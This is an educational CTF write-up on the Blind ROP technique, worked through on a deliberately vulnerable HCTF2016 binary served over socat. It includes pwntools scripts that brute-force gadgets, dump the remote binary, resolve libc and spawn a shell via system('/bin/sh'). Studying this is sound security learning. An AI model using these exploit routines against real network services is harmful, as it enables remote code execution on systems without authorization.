# Blind ROP

BROP (Blind ROP) was a technique found by Andrew Bittau from Stanford in 2014.
* [paper](http://www.scs.stanford.edu/brop/bittau-brop.pdf)
* [slides](http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf)

## Concepts
### Attack scenarios
* Most servers like nginx, OpenSSH, Apache, MySQL, forks then communicates with the client. This means canary and addresses stay the same even if there is ASLR and PIE. This means we can use some educated brute force to leak information and subsequently craft a working exploit.

### Flow
The general flow of exploiting this is
1) Find buffer overflow offset
2) Find canary
3) Find stop gadgets
4) Find brop gadgets
5) Find write/puts -> then we have leak
6) Leak as much of the binary as possible, so that we can analyze it locally
7) Leak a libc address
8) Get shell

### Terminology
Since all we have in control of is the return address, all we can do at the start is to use brute force to find some special gadgets that can aid us in developing our exploit.

#### Stop gadget
Stop gadgets are gadgets that tell us when to stop finding. Essentially, this gadget does not cause the program to crash, and either prints out something or stays in an infinite loop. This is helpful for us to detect gadgets that have `pop` instructions in it. 

Since from our perspective a service crashing or just finished executing looks the same, by setting the stop gadget as the return address of an address we want to test, we can know whether the instructions at that address actually crashed the service or had just finished executing.

![stop-gadget](https://raw.githubusercontent.com/nush-osi-layer-8/pwn/master/brop/images/stop_gadget.png)

#### BROP gadget
As the end of the `__libc_csu_init` function, there is a gadget that pops 6 registers from the stack. ([ret2_csu_init](https://github.com/nush-osi-layer-8/pwn/tree/master/ret2_csu_init))

If we take the addresses in between, we all have `pop rsi` and `pop rdi` gadgets.

![brop-gadget](https://raw.githubusercontent.com/nush-osi-layer-8/pwn/master/brop/images/brop_gadget.png)

## Exploitation
Explanation of the exploitation steps is described below with an accompanying example.

### Challenge
We take the challenge 出题人失踪了 from HCTF2016 as our example.

#### Source
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int i;
int check();

int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    puts("WelCome my friend,Do you know password?");
        if(!check()) {
            puts("Do not dump my memory");
        } else {
            puts("No password, no game");
        }
}

int check() {
    char buf[50];
    read(STDIN_FILENO, buf, 1024);
    return strcmp(buf, "aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk");
}
```

In this example we will not have canary, since it is just a mere brute force.
```bash
gcc -z noexecstack -fno-stack-protector -no-pie brop.c
```

#### Server
```bash
#!/bin/sh
while true; do
        num=`ps -ef | grep "socat" | grep -v "grep" | wc -l`
        if [ $num -lt 5 ]; then
                socat tcp4-listen:10001,reuseaddr,fork exec:./brop &
        fi
done
```

Execute this code in another terminal to emulate a server that forks and serves the binary. (This server setup doesn't seem to preserve address values for ASLR and PIE but we can still make an exploit for that since we compiled with no PIE).

### Stack Reading
Firstly, before doing anything, we need to check how many bytes we need to overflow the stack to control the return address.

```python
def get_overflow_length():
	i = 1
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.send('a' * i)
			output = r.recv()
			r.close()
			if not 'No password' in output:
				return i - 1
			else:
				i += 1
		except EOFError:
			r.close()
			return i - 1
```

If there is a canary, we have to brute-force it byte by byte, making it `256 * 8 = 2048` tries for 64-bit systems.

### Find stop gadget
As explained earlier, to find a BROP gadget, we need to use a stop gadget.

Our payload is in this form
```
padding_bytes|canary(if there is)|address
```

Just keep trying addresses until we find something that does not crash the service.

```python
def get_stop_gadget(offset):
	addr = 0x400000
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.send('a' * offset + p64(addr))
			content = r.recv()
			r.close()
			if 'WelCome' in content:
				return addr
			addr += 1
		except EOFError:
			r.close()
			addr += 1
		except PwnlibException:
			pass
```

We can find any address as long as it does not crash the service, or stays in an infinite loop. Here, I decided to find one that prints the welcome message.

### Find BROP gadget
Now that we have a stop gadget, we can use it to find the BROP gadget.

We can test for a gadget using the following form of payload.

```
padding_bytes|canary|address|bytes to pop|stop gadget|bad addresses
```

For example, if we want to test for `pop rdi; pop rsi; ret`, our payload would be

```
padding_bytes|canary|address|8 bytes for rdi|8 bytes for rsi|stop gadget|bad addresses
```

If it really does pop 2 registers, we will safely return to stop gadget and the service will not crash. This is an indicator that the gadget we are testing for really pops 2 registers. Any more of any less than that will crash the service.

In our case, we want to find the BROP gadget that pops 6 registers. So our payload would be,

```
padding|address|48 bytes to pop|stop gadget|bad addresses
```

(note that we have no canary in this example)

One concern is would we get a false alarm? A gadget that pops 6 addresses but is not the end of `__libc_csu_init`? Statistically speaking, it is almost impossible to find another gadget in a binary that pops 6 registers apart from this.

```python
# checks if the gadget pops 6 registers
def get_brop_gadget(offset, stop_gadget, addr):
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		r.send('a' * offset + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10)
		content = r.recv(timeout=0.1)
		r.close()
		return 'WelCome' in content
	except EOFError:
		r.close()
		return False
	except PwnlibException:
		return get_brop_gadget(offset, stop_gadget, addr)

# checks if it is not just a stop gadget itself
def check_brop_gadget(offset, addr):
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		payload = 'a' * offset + p64(addr) + 'a' * 8 * 10
		r.sendline(payload)
		content = r.recv()
		r.close()
		return False
	except EOFError:
		r.close()
		return True
	except PwnlibException:
		return check_brop_gadget(offset, addr)

def find_brop_gadget(offset, stop_gadget):
	addr = 0x400000
	while True:
		if get_brop_gadget(offset, stop_gadget, addr) and check_brop_gadget(offset, addr):
			return addr
		addr += 1
```

### Find leak function
Either `write` or `puts` would be fine for this use case. To use `puts` we just need to set `rdi` to the address we want to print, using `pop rdi; ret` from `brop_gadget + 0x9`.

`write` would be quite problematic, because it turns out to be that it is almost impossible to find `pop rdx; ret` or any equivalent gadgets in a binary.
Not only this, `write` needs a file descriptor as one of its arguments. Since it is a fork from the original service, `stdin` may not necessarily equal to 0.

We cannot be sure which of `write` or `puts` is present in the `plt`, or if they are even there, all we can do is test.

In our case, we will test for `puts` first, since it is easier. Our payload will be

```
padding|pop_rdi_ret|0x400000|address to test|stop_gadget
```

We will just print the value in `0x400000`, which in the case of no PIE, will contain the magic bytes `\x7fELF`.

```python
def find_puts(offset, rdi_ret, stop_gadget):
	addr = 0x400000
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.sendline('a' * offset + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget))
			content = r.recv()
			if '\x7fELF' in content:
				return addr
			r.close()
			addr += 1
		except EOFError:
			r.close()
			addr += 1
		except PwnlibException:
			pass
```

In this example, since `puts` is present in the `plt`, we don't bother checking for `write`.

However, let's still look at the case where we need to test for `write`. The payload would still be similar, except that we need to set more arguments.

#### Find fd
To find `fd`, we can either
* chain multiple `write` calls together with different `fd` arguments
* open a lot of connections to the service, and try large values for the `fd`

Some properties to take note are
* Linux by default only allows a process to spawn 1024 different fds
* In POSIX systems the smallest possible fd will be returned upon request

#### Set rdx for write
It is still fine to not be able to set `rdx`, because as long as `rdx` is not 0, something will be printed, and we can from this verify that the address we are testing corresponds to `write`. However, it would still be great if we can set `rdx`.

One way of doing this is to use `strcmp`, as `strcmp` will set `rdx` to be the length of the strings being compared.

#### Test strcmp
If we really need to find a `strcmp` gadget, it can be done by checking whether the gadget crashes the service. There are 4 cases when calling `strcmp`:
* `strcmp(bad address, bad address)`
* `strcmp(bad address, readable address)`
* `strcmp(readable address, bad address)`
* `strcmp(readable address, readable address)`

Only the last one will not crash the service.

Since at this point we will be able to leak the binary, we can also leak it and check if there is such a plt entry.

### Leak the binary
Using the `puts` gadget we found earlier, we can easily leak one page from the binary for us to analyze locally, using the payload

```
padding|pop_rdi_ret|address|puts|stop_gadget
```

```python
def leak(offset, addr, rdi_ret, puts, stop_gadget):
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		r.sendline('a' * offset + p64(rdi_ret) + p64(addr) + p64(puts) + p64(stop_gadget))
		content = r.recvuntil('WelCome')
		r.close()
		try:
			content = content[:content.index('\nWelCome')]
		except:
			pass
		if content == '':
			content = '\x00'
		return content
	except PwnlibException:
		return leak(offset, addr, rdi_ret, puts, stop_gadget)
	except EOFError:
		r.close()
		return None


def leak_bytes(progress, offset, start, num_bytes, rdi_ret, puts, stop_gadget):
	addr = start
	res = ''
	while addr < (start + num_bytes):
		if progress:
			progress.status('Leaked 0x%x bytes' % (addr - start))
		data = leak(offset, addr, rdi_ret, puts, stop_gadget)
		if data is None:
			continue
		res += data
		addr += len(data)

	return res


leaked = leak_bytes(p, offset, 0x400000, 0x1000, pop_rdi_ret, puts, stop_gadget)
open('leaked', 'w').write(leaked)
```

### Finishing up
At this point, it is just a typical ROP challenge. We can look into the plt to see what libc function addresses we can leak. Then use `LibcSearcher` to get us the address of `/bin/sh` and `system`.

```python
# Here I made another method to leak from an already opened remote session
# because as mentioned earlier the "server" we set up does not 
# preserve addresses from ASLR, meaning that the libc addresses will change every iteration.
def same_session_leak(r, offset, addr, rdi_ret, puts):
	main = 0x400697
	res = ''
	while len(res) < 8:
		r.sendline('a' * offset + p64(rdi_ret) + p64(addr) + p64(puts) + p64(main))
		try:
			content = r.recvuntil('WelCome my friend,Do you know password?\n')
		except EOFError:
			sleep(0.5)
			continue
		try:
			content = content[:content.index('\nWelCome')]
		except:
			pass
		if content == '':
			content = '\x00'
		res += content
		addr += len(content)
	return res

# prepares a payload to call a function
def call_function(offset, func, rdi, rdi_ret, return_addr):
	return 'a' * offset + p64(rdi_ret) + p64(rdi) + p64(func) + p64(return_addr)


r = remote(host, port)
r.recvuntil('WelCome my friend,Do you know password?\n')
puts_got = 0x601018
puts_libc = u64(same_session_leak(r, offset, puts_got, pop_rdi_ret, puts)[:8])

# resolve libc addresses
libc = LibcSearcher('puts', puts_libc)
libc_base = puts_libc - libc.dump('puts')

binsh = libc_base + libc.dump('str_bin_sh')
system = libc_base + libc.dump('system')

# call system
payload = call_function(offset, system, binsh, pop_rdi_ret, stop_gadget)
r.sendline(payload)
r.interactive()
```

And we get a shell!

## References
* https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/medium_rop/#blind-rop
* https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.1_pwn_hctf2016_brop.md
